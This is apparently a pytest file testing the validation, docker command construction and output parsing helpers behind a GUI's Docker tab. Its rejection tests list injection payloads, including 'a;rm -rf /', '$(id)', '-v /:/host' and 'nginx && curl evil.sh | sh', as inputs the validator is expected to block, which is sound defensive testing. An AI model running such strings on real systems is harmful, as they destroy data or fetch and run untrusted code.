"""Command building and output parsing for the Docker tab (no Qt needed)."""

import shlex

import pytest

import docker_utils as du


# ── validation ────────────────────────────────────────────────

@pytest.mark.parametrize("value", ["web", "my-app_1", "a.b-c", "3f2a9c1d7e44", "Web_01"])
def test_valid_names(value):
    assert du.validate_name(value) == value


@pytest.mark.parametrize("value", [
    "", "  ", "-rf", "a b", "a;rm -rf /", "$(id)", "a`id`", "x|y", "a&b", "a\nb", "x" * 600,
])
def test_invalid_names_rejected(value):
    with pytest.raises(ValueError):
        du.validate_name(value)


@pytest.mark.parametrize("value", [
    "nginx", "nginx:1.27", "ghcr.io/owner/app:v1", "registry:5000/team/app@sha256:abc123",
    "sha256:0123456789abcdef", "0123456789ab",
])
def test_valid_image_refs(value):
    assert du.validate_image_ref(value) == value


@pytest.mark.parametrize("value", ["", "-v /:/host", "nginx; id", "a b", "$(x)", "im\ng"])
def test_invalid_image_refs_rejected(value):
    with pytest.raises(ValueError):
        du.validate_image_ref(value)


# ── command construction ──────────────────────────────────────

def test_list_commands_use_json_format():
    for kind in ("containers", "images", "volumes", "networks"):
        cmd = du.list_command(kind)
        assert cmd.startswith("docker ")
        assert shlex.split(cmd)[-1] == "{{json .}}"


def test_list_command_unknown_kind():
    with pytest.raises(ValueError):
        du.list_command("secrets")


def test_container_actions():
    assert du.container_action_command("restart", "web") == "docker restart web"
    with pytest.raises(ValueError):
        du.container_action_command("exec", "web")
    with pytest.raises(ValueError):
        du.container_action_command("stop", "web; id")


def test_remove_commands():
    assert du.remove_container_command("web") == "docker rm web"
    assert du.remove_container_command("web", force=True) == "docker rm -f web"
    assert du.remove_image_command("nginx:1.27") == "docker rmi nginx:1.27"
    assert du.remove_volume_command("data") == "docker volume rm data"
    assert du.remove_network_command("backend") == "docker network rm backend"


def test_pull_command_validates():
    assert du.pull_command("nginx:latest") == "docker pull nginx:latest"
    with pytest.raises(ValueError):
        du.pull_command("nginx && curl evil.sh | sh")


def test_logs_command_options():
    cmd = du.logs_command("web", tail=50, follow=True, timestamps=True)
    assert cmd == "docker logs --tail 50 -t -f web 2>&1"
    assert "--tail 100000" in du.logs_command("web", tail=10**9)
    assert "--tail 1 " in du.logs_command("web", tail=0)


def test_exec_command_quotes_user_text_as_single_argument():
    cmd = du.exec_command("web", "ls -la /tmp; echo 'hi'")
    parts = shlex.split(cmd.replace(" 2>&1", ""))
    assert parts[:4] == ["docker", "exec", "web", "sh"]
    assert parts[4] == "-c"
    assert parts[5] == "ls -la /tmp; echo 'hi'"


def test_exec_command_rejects_empty_and_bad_container():
    with pytest.raises(ValueError):
        du.exec_command("web", "   ")
    with pytest.raises(ValueError):
        du.exec_command("web;id", "ls")


def test_inspect_commands():
    assert du.inspect_command("containers", "web") == "docker inspect web"
    assert du.inspect_command("images", "nginx:1.27") == "docker inspect nginx:1.27"
    assert du.inspect_command("volumes", "data") == "docker volume inspect data"
    assert du.inspect_command("networks", "backend") == "docker network inspect backend"
    with pytest.raises(ValueError):
        du.inspect_command("secrets", "x")


# ── output parsing ────────────────────────────────────────────

def test_volume_and_network_details_are_batched():
    volume = du.details_command("volumes")
    network = du.details_command("networks")
    assert "docker volume inspect --format" in volume
    assert "docker volume ls -q" in volume
    assert "docker network inspect --format" in network
    assert "docker network ls -q" in network
    with pytest.raises(ValueError):
        du.details_command("containers")


def test_stats_command_uses_single_json_lines_snapshot():
    command = du.stats_command()
    assert command.startswith("docker stats --no-stream --format ")
    assert "{{json .}}" in command


def test_parse_json_lines_skips_noise():
    text = (
        "WARNING: something from the CLI\n"
        '{"ID":"abc","Names":"web","State":"running"}\n'
        "\n"
        "sudo: unable to resolve host\n"
        "{not json}\n"
        '{"ID":"def","Names":"db","State":"exited"}\n'
        "[1, 2]\n"
    )
    rows = du.parse_json_lines(text)
    assert [r["Names"] for r in rows] == ["web", "db"]


def test_parse_json_lines_empty():
    assert du.parse_json_lines("") == []
    assert du.parse_json_lines(None) == []


def test_cell_and_image_display_ref():
    assert du.cell({"a": None}, "a") == ""
    assert du.cell({}, "a") == ""
    assert du.cell({"a": 5}, "a") == "5"
    assert du.image_display_ref({"Repository": "nginx", "Tag": "1.27", "ID": "x"}) == "nginx:1.27"
    assert du.image_display_ref({"Repository": "nginx", "Tag": "<none>", "ID": "x"}) == "nginx"
    assert du.image_display_ref({"Repository": "<none>", "Tag": "<none>", "ID": "sha256:ab"}) == "sha256:ab"


# ── error classification / state mapping ──────────────────────

@pytest.mark.parametrize("stderr,code,expected", [
    ("bash: docker: command not found", 127, "not installed"),
    ("permission denied while trying to connect to the Docker daemon socket at "
     "unix:///var/run/docker.sock", 1, "docker' group"),
    ("Cannot connect to the Docker daemon at unix:///var/run/docker.sock. "
     "Is the docker daemon running?", 1, "not running"),
    ("", 3, "status 3"),
])
def test_classify_error(stderr, code, expected):
    assert expected in du.classify_error(stderr, code)


def test_classify_error_unknown_or_ok():
    assert du.classify_error("Error response from daemon: No such container: x", 1) is None
    assert du.classify_error("", 0) is None


@pytest.mark.parametrize("state,kind", [
    ("running", "running"), ("Running", "running"), ("paused", "paused"),
    ("exited", "stopped"), ("created", "stopped"), ("dead", "stopped"),
    ("restarting", "other"), ("", "other"),
])
def test_state_kind(state, kind):
    assert du.state_kind(state) == kind
